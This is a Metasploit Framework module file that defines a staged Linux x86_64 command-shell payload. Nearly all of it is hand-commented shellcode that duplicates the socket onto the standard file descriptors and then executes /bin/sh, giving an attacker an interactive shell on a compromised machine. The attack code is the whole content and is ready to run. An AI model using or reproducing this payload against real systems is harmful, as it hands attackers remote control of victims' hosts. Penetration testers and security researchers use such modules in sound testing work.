##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##


require 'msf/core'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell',
			'Description'   => 'Spawn a command shell (staged)',
			'Author'        => 'ricky',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86_64,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Stage'         =>
				{
					'Payload' =>
						"\x6a\x03"                     + # pushq  $0x3
						"\x5e"                         + # pop    %rsi
						"\x48\xff\xce"                 + # dec    %rsi
						"\x6a\x21"                     + # pushq  $0x21
						"\x58"                         + # pop    %rax
						"\x0f\x05"                     + # syscall
						"\x75\xf6"                     + # jne    3 <dup2_loop>
						"\x6a\x3b"                     + # pushq  $0x3b
						"\x58"                         + # pop    %rax
						"\x99"                         + # cltd
						"\x48\xbb\x2f\x62\x69\x6e\x2f" + # movabs $0x68732f6e69622f,%rbx
						"\x73\x68\x00"                 + #
						"\x53"                         + # push   %rbx
						"\x48\x89\xe7"                 + # mov    %rsp,%rdi
						"\x52"                         + # push   %rdx
						"\x57"                         + # push   %rdi
						"\x48\x89\xe6"                 + # mov    %rsp,%rsi
						"\x0f\x05"                       # syscall
				}
			))
	end

end
